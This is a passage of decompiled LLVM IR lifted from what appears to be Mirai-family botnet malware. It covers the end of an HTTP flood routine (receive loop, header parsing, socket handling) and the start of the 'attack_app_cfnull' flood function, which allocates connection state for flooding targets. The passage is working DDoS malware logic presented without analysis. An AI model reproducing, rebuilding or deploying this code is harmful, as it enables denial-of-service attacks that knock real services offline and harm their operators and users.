  %v3_b658 = load i32, i32* %v2_b2d0, align 4
  %v2_b660 = sub i32 %v3_b658, %v2_b638
  %v1_b664 = inttoptr i32 %v2_b650 to i8*
  %v9_b674 = call i32 @util_memsearch(i8* %v1_b664, i32 %v2_b660, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e30.60, i32 0, i32 0), i32 1)
  %v1_b684 = add i32 %v2_b638, -1
  %v2_b68c = add i32 %v1_b684, %v9_b674
  %v3_b6a4 = add i32 %v1_b2e4, %v2_b68c
  %v4_b6a4 = inttoptr i32 %v3_b6a4 to i8*
  store i8 0, i8* %v4_b6a4, align 1
  %v3_b6b4 = load i32, i32* %v2_b56c, align 4
  %v3_b6b8 = mul i32 %v3_b6b4, 128
  %v2_b6bc = add i32 %v3_b6b8, %v1_b5a4
  store i32 %v2_b6bc, i32* @r4, align 4
  %v3_b6d0 = load i32, i32* %v2_b56c, align 4
  %v3_b6d4 = mul i32 %v3_b6d0, 128
  %v2_b6d8 = add i32 %v3_b6d4, %v1_b5a4
  %v1_b6dc = inttoptr i32 %v2_b6d8 to i8*
  %v3_b6e0 = call i32 @util_strlen(i8* %v1_b6dc)
  %v0_b6e8 = load i32, i32* @r4, align 4
  %v2_b6e8 = add i32 %v0_b6e8, %v3_b6e0
  %v1_b700 = inttoptr i32 %v2_b6e8 to i8*
  %v6_b708 = call i32 @util_strcpy(i8* %v1_b700, i8* %v1_b664)
  %v3_b710 = load i32, i32* %v2_b56c, align 4
  %v1_b714 = add i32 %v3_b710, 1
  store i32 %v1_b714, i32* %v2_b56c, align 4
  br label %dec_label_pc_b720

dec_label_pc_b720:                                ; preds = %dec_label_pc_b4c0, %dec_label_pc_b578, %dec_label_pc_b5a0
  store i32 -1, i32* %v2_b428, align 4
  store i8 10, i8* %v2_9e24, align 1
  br label %dec_label_pc_b2bc.backedge

dec_label_pc_b2bc.backedge:                       ; preds = %dec_label_pc_b8e4, %dec_label_pc_b8d8, %dec_label_pc_b720, %dec_label_pc_b874, %dec_label_pc_b8c8
  %v3_b2c0 = load i8, i8* %v2_9e24, align 1
  %v7_b2c4 = icmp eq i8 %v3_b2c0, 7
  br i1 %v7_b2c4, label %dec_label_pc_b2cc, label %dec_label_pc_ba58

dec_label_pc_b73c:                                ; preds = %bb174, %dec_label_pc_b47c, %dec_label_pc_b41c
  %start_pos_-52.0 = phi i32 [ 0, %dec_label_pc_b41c ], [ %v0_b450, %dec_label_pc_b47c ], [ %v0_b450, %bb174 ]
  %v3_b740 = load i32, i32* %v2_b428, align 4
  %v2_b744 = icmp eq i32 %v3_b740, 0
  br i1 %v2_b744, label %dec_label_pc_b74c, label %dec_label_pc_b8d8

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b73c
  %v3_b750 = load i32, i32* %v2_b750, align 4
  %v7_b754 = icmp eq i32 %v3_b750, 1
  br i1 %v7_b754, label %dec_label_pc_b75c, label %dec_label_pc_b8a0

dec_label_pc_b75c:                                ; preds = %dec_label_pc_b74c
  %v3_b76c = load i32, i32* %v2_b2d0, align 4
  %v8_b780 = call i32 @util_memsearch(i8* %v1_b770, i32 %v3_b76c, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v7_b788 = icmp eq i32 %v8_b780, -1
  br i1 %v7_b788, label %dec_label_pc_b8d8, label %dec_label_pc_b790

dec_label_pc_b790:                                ; preds = %dec_label_pc_b75c
  %v3_b7a0 = load i32, i32* %v2_b2d0, align 4
  %v8_b7b4 = call i32 @util_memsearch(i8* %v1_b770, i32 %v3_b7a0, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v3_b7dc = add i32 %v2_b7d0, %v8_b7b4
  %v4_b7dc = inttoptr i32 %v3_b7dc to i8*
  store i8 0, i8* %v4_b7dc, align 1
  %v9_b7fc = call i32 @util_memsearch(i8* %v1_b770, i32 %v8_b7b4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e14.51, i32 0, i32 0), i32 1)
  %v7_b804 = icmp eq i32 %v9_b7fc, -1
  br i1 %v7_b804, label %dec_label_pc_b848, label %dec_label_pc_b80c

dec_label_pc_b80c:                                ; preds = %dec_label_pc_b790
  %v8_b828 = call i32 @util_memsearch(i8* %v1_b770, i32 %v8_b7b4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e14.51, i32 0, i32 0), i32 1)
  %v2_b838 = add i32 %v8_b828, %v2_9cb0
  %v3_b844 = add i32 %v2_b838, 2116
  %v4_b844 = inttoptr i32 %v3_b844 to i8*
  store i8 0, i8* %v4_b844, align 1
  br label %dec_label_pc_b848

dec_label_pc_b848:                                ; preds = %dec_label_pc_b790, %dec_label_pc_b80c
  %v4_b85c = call i32 @util_atoi(i8* %v1_b770, i32 16)
  %v2_b86c = icmp eq i32 %v4_b85c, 0
  br i1 %v2_b86c, label %dec_label_pc_b874, label %dec_label_pc_b884

dec_label_pc_b874:                                ; preds = %dec_label_pc_b848
  store i8 1, i8* %v2_9e24, align 1
  br label %dec_label_pc_b2bc.backedge

dec_label_pc_b884:                                ; preds = %dec_label_pc_b848
  %v1_b888 = add i32 %v4_b85c, 2
  store i32 %v1_b888, i32* %v2_b428, align 4
  br label %dec_label_pc_b8d8

dec_label_pc_b8a0:                                ; preds = %dec_label_pc_b74c
  %v3_b8a4 = load i32, i32* %v2_b2d0, align 4
  %v2_b8ac = sub i32 %v3_b8a4, %start_pos_-52.0
  store i32 %v2_b8ac, i32* %v2_b428, align 4
  %v2_b8c0 = icmp eq i32 %v2_b8ac, 0
  br i1 %v2_b8c0, label %dec_label_pc_b8c8, label %dec_label_pc_b8d8

dec_label_pc_b8c8:                                ; preds = %dec_label_pc_b8a0
  store i8 1, i8* %v2_9e24, align 1
  br label %dec_label_pc_b2bc.backedge

dec_label_pc_b8d8:                                ; preds = %dec_label_pc_b8a0, %dec_label_pc_b73c, %dec_label_pc_b75c, %dec_label_pc_b884
  %start_pos_-52.1 = phi i32 [ %start_pos_-52.0, %dec_label_pc_b75c ], [ %v8_b7b4, %dec_label_pc_b884 ], [ %start_pos_-52.0, %dec_label_pc_b8a0 ], [ %start_pos_-52.0, %dec_label_pc_b73c ]
  %v2_b8dc = icmp eq i32 %start_pos_-52.1, 0
  br i1 %v2_b8dc, label %dec_label_pc_b2bc.backedge, label %dec_label_pc_b8e4

dec_label_pc_b8e4:                                ; preds = %dec_label_pc_b8d8
  %v3_b8e8 = load i32, i32* %v2_b2d0, align 4
  %v2_b8f0 = sub i32 %v3_b8e8, %start_pos_-52.1
  store i32 %v2_b8f0, i32* %v2_b2d0, align 4
  %v2_b918 = add i32 %start_pos_-52.1, %v1_b2e4
  store i32 %v2_b8f0, i32* @r3, align 4
  store i32 %v1_b2e4, i32* @r0, align 4
  store i32 %v2_b918, i32* @r1, align 4
  store i32 %v2_b8f0, i32* @r2, align 4
  %v3_b930 = call i32 @memmove(i32 %v1_b2e4, i32 %v2_b918, i32 %v2_b8f0)
  %v3_b938 = load i32, i32* %v2_b2d0, align 4
  %v2_b944 = add i32 %v3_b938, %v2_9cb0
  %v3_b950 = add i32 %v2_b944, 2116
  %v4_b950 = inttoptr i32 %v3_b950 to i8*
  store i8 0, i8* %v4_b950, align 1
  %v3_b958 = load i32, i32* %v2_b2d0, align 4
  %v2_b95c = icmp eq i32 %v3_b958, 0
  br i1 %v2_b95c, label %dec_label_pc_b2bc.backedge, label %dec_label_pc_b41c

dec_label_pc_b968:                                ; preds = %dec_label_pc_b2ac
  %v7_b970 = icmp eq i8 %v3_b2b0, 10
  br i1 %v7_b970, label %dec_label_pc_b978, label %dec_label_pc_ba58

dec_label_pc_b978:                                ; preds = %dec_label_pc_b968, %dec_label_pc_b9dc
  %v0_b978 = call i32 @__GI___errno_location()
  %v2_b984 = inttoptr i32 %v0_b978 to i32*
  store i32 0, i32* %v2_b984, align 4
  %v2_b98c = load i32, i32* %v1_9cbc, align 4
  %v4_b9ac = call i32 @__libc_recv(i32 %v2_b98c, i32 %v3_8410, i32 10240, i32 16384)
  %v2_b9bc = icmp eq i32 %v4_b9ac, 0
  br i1 %v2_b9bc, label %dec_label_pc_b9c4, label %dec_label_pc_b9dc

dec_label_pc_b9c4:                                ; preds = %dec_label_pc_b978
  %v0_b9c4 = call i32 @__GI___errno_location()
  %v2_b9d0 = inttoptr i32 %v0_b9c4 to i32*
  store i32 104, i32* %v2_b9d0, align 4
  br label %dec_label_pc_b9dc

dec_label_pc_b9dc:                                ; preds = %dec_label_pc_b978, %dec_label_pc_b9c4
  %http_table_-204.1 = phi i32 [ -1, %dec_label_pc_b9c4 ], [ %v4_b9ac, %dec_label_pc_b978 ]
  %v3_b9e0 = icmp eq i32 %http_table_-204.1, -1
  br i1 %v3_b9e0, label %dec_label_pc_b9e8, label %dec_label_pc_b978

dec_label_pc_b9e8:                                ; preds = %dec_label_pc_b9dc
  %v0_b9e8 = call i32 @__GI___errno_location()
  %v1_b9f0 = inttoptr i32 %v0_b9e8 to i32*
  %v2_b9f0 = load i32, i32* %v1_b9f0, align 4
  %v7_b9f4 = icmp eq i32 %v2_b9f0, 11
  br i1 %v7_b9f4, label %dec_label_pc_ba38, label %dec_label_pc_b9fc

dec_label_pc_b9fc:                                ; preds = %dec_label_pc_b9e8
  %v0_b9fc = call i32 @__GI___errno_location()
  %v1_ba04 = inttoptr i32 %v0_b9fc to i32*
  %v2_ba04 = load i32, i32* %v1_ba04, align 4
  %v7_ba08 = icmp eq i32 %v2_ba04, 11
  br i1 %v7_ba08, label %dec_label_pc_ba38, label %dec_label_pc_ba10

dec_label_pc_ba10:                                ; preds = %dec_label_pc_b9fc
  %v2_ba14 = load i32, i32* %v1_9cbc, align 4
  %v1_ba1c = call i32 @__GI___libc_close(i32 %v2_ba14)
  store i32 -1, i32* %v1_9cbc, align 4
  store i8 0, i8* %v2_9e24, align 1
  br label %dec_label_pc_ba38

dec_label_pc_ba38:                                ; preds = %dec_label_pc_b9fc, %dec_label_pc_b9e8, %dec_label_pc_ba10
  %v3_ba3c = load i8, i8* %v2_9e24, align 1
  %v2_ba40 = icmp eq i8 %v3_ba3c, 0
  br i1 %v2_ba40, label %dec_label_pc_ba58, label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba38
  store i8 1, i8* %v2_9e24, align 1
  br label %dec_label_pc_ba58

dec_label_pc_ba58:                                ; preds = %dec_label_pc_b2bc.backedge, %dec_label_pc_b2bc.preheader, %dec_label_pc_ba38, %dec_label_pc_b968, %dec_label_pc_b3b8, %dec_label_pc_b3a4, %dec_label_pc_9ee8, %dec_label_pc_9dd8, %dec_label_pc_9c84, %dec_label_pc_b3cc, %dec_label_pc_b274, %dec_label_pc_b19c, %dec_label_pc_ab54, %dec_label_pc_9e90, %dec_label_pc_9dac, %dec_label_pc_ba4c
  %v1_ba5c = add nuw nsw i32 %storemerge25202, 1
  %v5_ba70 = icmp slt i32 %v1_ba5c, %sockets_-180.0
  br i1 %v5_ba70, label %dec_label_pc_9c84, label %dec_label_pc_8d08.lr.ph

dec_label_pc_ba78:                                ; preds = %dec_label_pc_8438, %dec_label_pc_8470, %dec_label_pc_845c, %dec_label_pc_8448, %entry
  store i32 %v3_8244, i32* %r4.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v1_ba5c, { 1, 0 }
  uselistorder i32 %v2_b918, { 1, 0 }
  uselistorder i32 %v2_b8f0, { 1, 2, 0, 3 }
  uselistorder i32 %v8_b7b4, { 2, 1, 3, 0 }
  uselistorder i32 %start_pos_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_b638, { 0, 2, 1 }
  uselistorder i32 %v3_b56c, { 1, 0, 3, 2 }
  uselistorder i8* %v1_b524, { 1, 0, 2 }
  uselistorder i32 %v8_b4f4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b450, { 2, 1, 0 }
  uselistorder i32 %v2_b444, { 1, 0 }
  uselistorder i32 %v3_b440, { 1, 0, 2 }
  uselistorder i32 %v3_b438, { 2, 0, 1, 3 }
  uselistorder i8* %v1_b770, { 1, 0, 2, 3, 4 }
  uselistorder i32* %v2_b428, { 4, 5, 6, 0, 1, 2, 3, 7 }
  uselistorder i32 %v1_b2e4, { 6, 5, 1, 0, 2, 3, 9, 8, 4, 10, 11, 7 }
  uselistorder i32* %v2_b2d0, { 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 %v1_b014, { 0, 2, 1 }
  uselistorder i32 %v3_aff4, { 1, 0 }
  uselistorder i8* %v4_af54, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v2_af4c, { 3, 4, 0, 1, 6, 5, 2, 7, 8 }
  uselistorder i32 %v3_ae60, { 1, 0 }
  uselistorder i32 %v3_ae44.pre, { 1, 0 }
  uselistorder i32 %v1_ad80, { 1, 0, 2 }
  uselistorder i32 %v1_ace4, { 0, 2, 1, 3 }
  uselistorder i32 %v4_ac80, { 1, 0 }
  uselistorder i32 %v8_ac30, { 1, 0, 2 }
  uselistorder i8* %v1_ac20, { 1, 0, 2 }
  uselistorder i32 %v2_ac10, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11 }
  uselistorder i32 %nl_off_-68.0, { 1, 0 }
  uselistorder i32 %v7_abc0, { 1, 2, 0 }
  uselistorder i32 %v1_a9cc, { 0, 2, 1 }
  uselistorder i32 %v3_a9ac, { 1, 0 }
  uselistorder i32 %v3_a95c, { 1, 0 }
  uselistorder i32 %stack_var_-76.0, { 1, 0 }
  uselistorder i32 %v8_a894, { 2, 1, 3, 0 }
  uselistorder i8* %v1_a884, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v2_a874, { 8, 7, 1, 2, 5, 6, 3, 4, 0, 9 }
  uselistorder i32 %stack_var_-80.0, { 1, 0 }
  uselistorder i32 %v7_a824, { 1, 2, 0 }
  uselistorder i32 %v3_a7bc, { 1, 0, 3, 2 }
  uselistorder i32 %v2_a788, { 2, 1, 0 }
  uselistorder i32 %storemerge26, { 0, 2, 3, 1 }
  uselistorder i32 %v2_a708, { 1, 0 }
  uselistorder i32 %v3_a700, { 3, 0, 1, 2 }
  uselistorder i32 %v3_a6bc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v3_a670, { 0, 1, 4, 2, 3 }
  uselistorder i8* %v4_a664, { 1, 2, 0, 3 }
  uselistorder i32 %v2_a538, { 1, 2, 3, 0 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %v8_a504, { 1, 0, 2 }
  uselistorder i32 %stack_var_-100.0, { 1, 0, 2 }
  uselistorder i32 %v7_a47c, { 1, 2, 0 }
  uselistorder i32* %v2_a7bc, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v8_a3a4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-112.0, { 1, 0 }
  uselistorder i32 %v7_a334, { 1, 2, 0 }
  uselistorder i32 %v8_a220, { 1, 0, 2 }
  uselistorder i8* %v1_a210, { 1, 0, 2 }
  uselistorder i32 %stack_var_-124.0, { 1, 0 }
  uselistorder i32 %v7_a1b0, { 1, 2, 0 }
  uselistorder i32 %v8_a094, { 2, 1, 3, 0 }
  uselistorder i32 %stack_var_-136.0, { 1, 0 }
  uselistorder i32 %v7_a024, { 1, 2, 0 }
  uselistorder i32 %v4_9e78, { 12, 13, 10, 11, 14, 8, 9, 15, 16, 6, 7, 4, 5, 17, 2, 3, 18, 0, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8* %v2_9e24, { 1, 2, 0, 4, 5, 7, 3, 6, 8, 13, 14, 12, 11, 10, 9, 15 }
  uselistorder i32* %v1_9cbc, { 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 0, 1, 2, 15, 16, 17 }
  uselistorder i32 %v2_9cb0, { 0, 1, 3, 2, 6, 7, 8, 9, 10, 11, 13, 12, 14, 27, 26, 23, 25, 24, 20, 22, 21, 18, 19, 28, 17, 29, 30, 16, 15, 31, 4, 5, 32 }
  uselistorder i32 %v2_9c60, { 1, 0 }
  uselistorder i32 %nfds_-172.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_9bc0, { 1, 0 }
  uselistorder i32 %v2_9b3c, { 1, 0 }
  uselistorder i32 %v2_9b34, { 3, 0, 1, 2 }
  uselistorder i32 %v2_9aa0, { 1, 0 }
  uselistorder i32 %v2_9a98, { 3, 0, 1, 2 }
  uselistorder i32 %v2_9a04, { 1, 0 }
  uselistorder i32 %v2_99fc, { 3, 0, 1, 2 }
  uselistorder i32 %v2_9968, { 1, 0 }
  uselistorder i32 %v2_9960, { 3, 0, 1, 2 }
  uselistorder i32 %v2_9798, { 1, 0 }
  uselistorder i32 %v3_9790, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge32, { 1, 0, 2, 3 }
  uselistorder i32 %v2_90ec, { 1, 0 }
  uselistorder i32 %v2_90e4, { 3, 0, 1, 2 }
  uselistorder i32 %v2_9008, { 1, 0 }
  uselistorder i32 %v2_9000, { 3, 0, 1, 2 }
  uselistorder i32* %v1_8e40, { 1, 2, 3, 4, 5, 6, 8, 7, 9, 0, 10 }
  uselistorder i8* %v2_8db8, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12 }
  uselistorder i32 %v2_8dac, { 0, 1, 2, 3, 5, 6, 7, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23 }
  uselistorder i32 %nfds_-172.1191, { 20, 19, 16, 13, 10, 7, 6, 3, 0, 18, 26, 17, 15, 25, 14, 12, 24, 11, 9, 23, 8, 5, 22, 4, 2, 21, 1 }
  uselistorder i32 %storemerge24192, { 1, 2, 0 }
  uselistorder i32 %v1_8d60, { 1, 0 }
  uselistorder i32 %v4_8d68181, { 1, 0 }
  uselistorder i32 %storemerge2341, { 1, 0 }
  uselistorder i8* %tmp161, { 10, 9, 11, 7, 6, 8, 0, 1, 2, 3, 4, 5, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_9184, { 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %v2_8d38, { 1, 0 }
  uselistorder i32 %v2_8cf4, { 1, 0 }
  uselistorder i32 %v1_8cbc, { 1, 0 }
  uselistorder i32 %v0_8a20, { 1, 0 }
  uselistorder i32 %v3_87c0, { 1, 0, 2 }
  uselistorder i32 %v2_85dc, { 4, 3, 2, 1, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v3_85d0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge22210, { 1, 0, 2 }
  uselistorder i32 %sockets_-180.0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_8510, { 3, 0, 2, 1 }
  uselistorder i8* %v3_8428, { 9, 8, 3, 7, 2, 6, 1, 5, 10, 4, 11, 0, 12, 13, 14, 15, 16 }
  uselistorder i32 %v3_8410, { 14, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16 }
  uselistorder i8* %v14_82e0, { 1, 0, 2 }
  uselistorder i32 %v2_8260, { 11, 10, 9, 8, 0, 12, 1, 13, 14, 2, 15, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 21 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %i_-216, { 12, 13, 14, 15, 16, 17, 10, 2, 18, 19, 20, 21, 22, 23, 24, 1, 25, 26, 27, 9, 3, 28, 29, 30, 31, 32, 33, 11, 4, 34, 35, 8, 36, 37, 7, 6, 38, 39, 40, 42, 41, 5, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e30.60, i32 0, i32 0), { 1, 0 }
  uselistorder i8 61, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e14.51, i32 0, i32 0), { 3, 2, 1, 0 }
  uselistorder i8* inttoptr (i32 2 to i8*), { 1, 0, 2, 3 }
  uselistorder i32 -10588, { 4, 3, 2, 1, 0 }
  uselistorder i32 2116, { 1, 2, 3, 4, 0 }
  uselistorder i32 -10716, { 2, 1, 0 }
  uselistorder i32 533, { 1, 2, 3, 4, 0 }
  uselistorder i32 789, { 2, 3, 1, 0 }
  uselistorder i32 1431, { 2, 3, 1, 0 }
  uselistorder i32 1440, { 1, 0 }
  uselistorder i32 3140, { 2, 1, 0, 3 }
  uselistorder [4 x i8]* @global_var_22dc8.29, { 1, 0 }
  uselistorder i8 %opts_len, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_ba78, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_ba58, { 15, 2, 3, 0, 9, 4, 5, 1, 10, 11, 12, 6, 13, 7, 14, 8 }
  uselistorder label %dec_label_pc_ba38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b9dc, { 1, 0 }
  uselistorder label %dec_label_pc_b978, { 1, 0 }
  uselistorder label %dec_label_pc_b8d8, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_b848, { 1, 0 }
  uselistorder label %dec_label_pc_b73c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b2bc.backedge, { 0, 1, 4, 3, 2 }
  uselistorder label %dec_label_pc_b720, { 2, 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %dec_label_pc_b398, { 1, 0 }
  uselistorder label %dec_label_pc_b31c, { 1, 0 }
  uselistorder label %dec_label_pc_b2cc, { 1, 0 }
  uselistorder label %dec_label_pc_b274, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b238, { 1, 0 }
  uselistorder label %dec_label_pc_b19c, { 6, 1, 2, 0, 5, 3, 4 }
  uselistorder label %dec_label_pc_b078, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b038, { 0, 2, 1 }
  uselistorder label %dec_label_pc_afd8, { 1, 0 }
  uselistorder label %dec_label_pc_afa4, { 1, 0 }
  uselistorder label %dec_label_pc_af40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af20, { 1, 0 }
  uselistorder label %dec_label_pc_aee8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae44, { 1, 0 }
  uselistorder label %dec_label_pc_adb0, { 1, 0 }
  uselistorder label %dec_label_pc_ad40, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_ad08, { 1, 0 }
  uselistorder label %dec_label_pc_ac7c, { 1, 0 }
  uselistorder label %dec_label_pc_abfc, { 1, 0 }
  uselistorder label %dec_label_pc_ab54, { 6, 1, 2, 0, 5, 3, 4 }
  uselistorder label %dec_label_pc_aa30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9f0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_a990, { 1, 0 }
  uselistorder label %dec_label_pc_a95c, { 1, 0 }
  uselistorder label %dec_label_pc_a8e0, { 1, 0 }
  uselistorder label %dec_label_pc_a860, { 1, 0 }
  uselistorder label %dec_label_pc_a778, { 1, 0 }
  uselistorder label %dec_label_pc_a768, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_a6fc, { 1, 0 }
  uselistorder label %dec_label_pc_a67c, { 1, 0 }
  uselistorder label %dec_label_pc_a664, { 1, 0 }
  uselistorder label %dec_label_pc_a600, { 1, 0 }
  uselistorder label %dec_label_pc_a558, { 1, 0 }
  uselistorder label %dec_label_pc_a4c0, { 1, 0 }
  uselistorder label %dec_label_pc_a778.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a3f0, { 1, 0 }
  uselistorder label %dec_label_pc_a370, { 1, 0 }
  uselistorder label %dec_label_pc_a2d8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a26c, { 1, 0 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_a14c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a0e0, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_9fc0, { 1, 0 }
  uselistorder label %dec_label_pc_9f7c, { 1, 0 }
  uselistorder label %dec_label_pc_9efc, { 1, 0 }
  uselistorder label %dec_label_pc_9dd8, { 1, 0 }
  uselistorder label %dec_label_pc_9c84, { 1, 0 }
  uselistorder label %dec_label_pc_9bbc, { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 14, 6, 7 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
  uselistorder label %dec_label_pc_9854, { 1, 0 }
  uselistorder label %dec_label_pc_97d8, { 1, 0 }
  uselistorder label %dec_label_pc_978c, { 1, 0 }
  uselistorder label %dec_label_pc_96ac, { 1, 0 }
  uselistorder label %dec_label_pc_8e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8df0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8d80, { 1, 0 }
  uselistorder label %dec_label_pc_8d4c, { 1, 0 }
  uselistorder label %dec_label_pc_8d08, { 1, 0 }
  uselistorder label %dec_label_pc_8d08.lr.ph, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8c78, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8a20, { 1, 0 }
  uselistorder label %dec_label_pc_8810, { 1, 0 }
  uselistorder label %dec_label_pc_85b0, { 1, 0 }
  uselistorder label %dec_label_pc_8530, { 1, 0 }
  uselistorder label %dec_label_pc_8504, { 1, 0 }
  uselistorder label %dec_label_pc_84f8, { 2, 0, 1 }
}

define void @attack_app_cfnull(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %tmp20 = sext i8 %targs_len to i32
  %__arr_-10376 = alloca %anon_struct_0*, align 4
  %sent_-10372 = alloca i32, align 4
  %tim_-10348 = alloca %timeval.12, align 8
  %szbuf_-10368 = alloca i32, align 4
  %tmpcast = bitcast i32* %szbuf_-10368 to [4 x i8]*
  %buf_-20872 = alloca [10240 x i8], align 1
  %i_-96 = alloca i32, align 4
  %addr_-10364 = alloca i32, align 4
  %__arr_-10632 = alloca %anon_struct_0*, align 4
  %__arr_-10504 = alloca %anon_struct_0*, align 4
  %generic_memes_-10337 = alloca [10241 x i8], align 1
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 47760, i32* %stack_var_-4, align 4
  %v2_ba8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ba8c, i32* @fp, align 4
  %v2_baa4 = ptrtoint i32* %stack_var_-32 to i32
  %v14_bb24 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 8, i8* null)
  %v9_bb5c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 24, i32 1)
  store i32 %v2_baa4, i32* @lr, align 4
  %v3_bb88 = getelementptr inbounds [10241 x i8], [10241 x i8]* %generic_memes_-10337, i32 0, i32 0
  %v4_bb88 = call i32 @__GI_memset(i8* %v3_bb88, i32 0, i32 10241)
  %v2_bb90 = icmp eq i8* %v14_bb24, null
  br i1 %v2_bb90, label %dec_label_pc_d26c, label %dec_label_pc_bb98

dec_label_pc_bb98:                                ; preds = %entry
  %v3_bb9c = call i32 @util_strlen(i8* nonnull %v14_bb24)
  %v8_bba8 = icmp sgt i32 %v3_bb9c, 127
  br i1 %v8_bba8, label %dec_label_pc_d26c, label %dec_label_pc_bbac

dec_label_pc_bbac:                                ; preds = %dec_label_pc_bb98
  %v7_bbb4 = icmp slt i32 %v9_bb5c, 257
  br i1 %v7_bbb4, label %dec_label_pc_bbc0, label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bbac
  br label %dec_label_pc_bbc0

dec_label_pc_bbc0:                                ; preds = %dec_label_pc_bbac, %dec_label_pc_bbb8
  %mfd_-72.0 = phi i32 [ %v9_bb5c, %dec_label_pc_bbac ], [ 256, %dec_label_pc_bbb8 ]
  %v2_bbcc = call i32 @calloc(i32 %mfd_-72.0, i32 668)
  %v6_bc90 = urem i32 %tmp20, 256
  %v2_bd00 = add i32 %v2_bbcc, 532
  %v5_c0cc108 = icmp sgt i32 %mfd_-72.0, 0
  br i1 %v5_c0cc108, label %dec_label_pc_bbe4, label %dec_label_pc_c0d0.preheader

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bbc0, %dec_label_pc_c0b4
  %storemerge12109 = phi i32 [ %v1_c0b8, %dec_label_pc_c0b4 ], [ 0, %dec_label_pc_bbc0 ]
  %v3_bc04 = mul i32 %storemerge12109, 668
  %v2_bc10 = add i32 %v3_bc04, %v2_bbcc
  %v3_bc18 = add i32 %v2_bc10, 4
  %v4_bc18 = inttoptr i32 %v3_bc18 to i8*
  store i8 0, i8* %v4_bc18, align 1
  %v2_bc50 = inttoptr i32 %v2_bc10 to i32*
  store i32 -1, i32* %v2_bc50, align 4
  store i32 %v2_bc10, i32* @r4, align 4
  %v3_bca0 = urem i32 %storemerge12109, %v6_bc90
  %v2_bcb0 = mul nuw nsw i32 %v3_bca0, 24
  %v2_bcc8 = add i32 %v2_bcb0, %targs
  %v1_bccc = add i32 %v2_bcc8, 16
  %v2_bccc = inttoptr i32 %v1_bccc to i32*
  %v3_bccc = load i32, i32* %v2_bccc, align 4
  %v2_bcd0 = add i32 %v2_bc10, 16
  %v3_bcd0 = inttoptr i32 %v2_bcd0 to i32*
  store i32 %v3_bccc, i32* %v3_bcd0, align 4
